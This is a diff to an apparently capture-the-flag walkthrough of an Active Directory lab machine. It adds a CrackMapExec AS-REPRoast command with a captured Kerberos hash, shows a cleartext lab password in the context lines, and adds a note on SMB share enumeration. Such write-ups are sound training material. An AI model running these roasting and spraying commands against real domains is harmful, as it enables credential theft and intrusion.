@@ -261,6 +261,14 @@ crackmapexec smb 10.129.228.64 -u users.txt -p '' --continue-on-success
 
 <figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>
 
+#### CrackMapExec AS-REPRoast
+
+```
+cme ldap absolute.htb -u d.klay -p '' --asreproast output.txt
+SMB         10.129.228.64   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.228.64   445    DC               $krb5asrep$23$d.klay@ABSOLUTE.HTB:50be22347465f43a8801b04ac5ab5be4$e6ea03fd11bc1e34330e9981a772262b915dfb59ce852cc10b9087980ab3484fac7ebf29bbea0f3c59482da4384e5b5bdd7b8c5df1977a11da9b2a3e813f065d8c3a033cead1264027af84a3bc695574c4d9cc2ab380a677ae4f7916f794ce2e3204fda6fd22bfd44c80bd27cc75c0fa00ecba7fbe5384fab2a33cb8dedd1f1b20c42a325135ef0164336ceb054ad5b8383a9b2933e57c1b042ec19ae1b06c0da4f9d4818d0fb400607c11087818063d37f3bf598f08313711c5d0fcbfca17cc5be358c9ecbbdeb7a614cb87da31b1ea66fc640ff80ad0b87552dc6ec665b30d0b368d5c1d1ceafa53a0dcf7
+```
+
 #### GetNPUsers.py AS-REPRoast
 
 We can also AS-REPRoast with Impacket:
@@ -666,6 +674,14 @@ cme ldap absolute.htb -u d.klay -p Darkmoonsky248girl --kdcHost 10.129.228.64 -M
 SMB         10.129.228.64   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 LDAP        10.129.228.64   445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl 
 ```
+
+After a box reset, I was able to start seeing useful information:
+
+Enumerating SMB Shares:
+
+<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
+
+
 
 ## Privilege Escalation
 
